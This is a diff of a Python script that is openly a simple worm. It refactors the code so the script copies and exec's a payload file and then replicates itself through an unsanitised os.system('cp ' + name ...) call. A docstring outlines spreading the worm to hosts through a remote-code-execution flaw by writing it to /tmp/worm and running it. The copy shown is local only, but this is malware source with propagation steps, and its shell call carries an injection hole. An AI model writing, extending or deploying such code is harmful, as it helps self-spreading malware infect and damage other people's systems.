@@ -24,23 +24,26 @@ def execute_payload():
 	exec(open(payload_name).read())
 	#os.chmod(payload_name, 0o744) # Changes permissions to: -rwxr--r--
 
-def main():
-	copy_payload()
-	execute_payload()
-
-	# Rudimentary way to make a LOCAL copy of itself when executed
+# Rudimentary way to make a LOCAL copy of itself when executed
+def replicate():
 	script = sys.argv
 	name = script[0] # type: string
 
 	os.mkdir('test')
 	os.system('cp ' + name + ' test')
 
+def main():
+	copy_payload()
+	execute_payload()
+	replicate()
+	
+
 	"""
 	Making a copy of itself on vulnerable host:
 	1) Identify RCE vulnerability
 	2) Bring this script to host using RCE vulnerability (eg. echo [contents] > /tmp/worm)
 	3) Execute /tmp/worm on vulnerable host
-	4) This will propagage
+	4) This will propagate
 	"""
 
 main()
